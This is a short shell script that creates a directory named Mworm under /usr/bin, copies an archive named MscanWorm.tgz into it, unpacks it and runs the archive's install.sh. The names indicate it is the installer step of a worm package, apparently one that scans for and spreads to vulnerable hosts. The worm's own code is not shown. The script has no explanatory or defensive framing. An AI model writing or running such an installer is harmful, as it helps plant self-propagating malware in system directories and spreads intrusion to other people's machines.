   #!/bin/sh

   mkdir /usr/bin/Mworm
   cp ../MscanWorm.tgz /usr/bin/Mworm
   cd /usr/bin/Mworm
   tar -xzvf MscanWorm.tgz
   cd MscanWorm
   sh install.sh
